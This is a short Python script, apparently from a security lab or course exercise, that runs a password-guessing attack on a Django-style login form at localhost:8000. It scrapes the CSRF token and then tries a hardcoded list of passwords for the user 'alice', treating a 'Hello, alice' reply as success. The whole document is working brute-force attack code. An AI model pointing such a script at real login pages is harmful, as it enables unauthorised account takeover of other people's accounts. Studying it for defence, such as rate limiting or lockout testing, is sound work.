import requests
import re

def attack_login_form():
    def try_username_password(username, password, csrf):
        print(f"try {password}")
        r = session.post("http://localhost:8000/login/", {
            "csrfmiddlewaretoken": csrf,
            "username": username,
            "password": password
        })
        if "Hello, "+username in r.text:
            return True
    session = requests.Session()
    r = session.get("http://localhost:8000/login/")
    csrf = re.findall('csrfmiddlewaretoken" value="(.*?)"', r.text)[0]
    username = "alice"
    for password in [
        "bluequeen",
        "greenqueen",
        "redking",
        "bluemouse",
        "redqueen"
    ]:
        if try_username_password(username, password, csrf):
            return f"Found correct password '{password}'"

print(attack_login_form())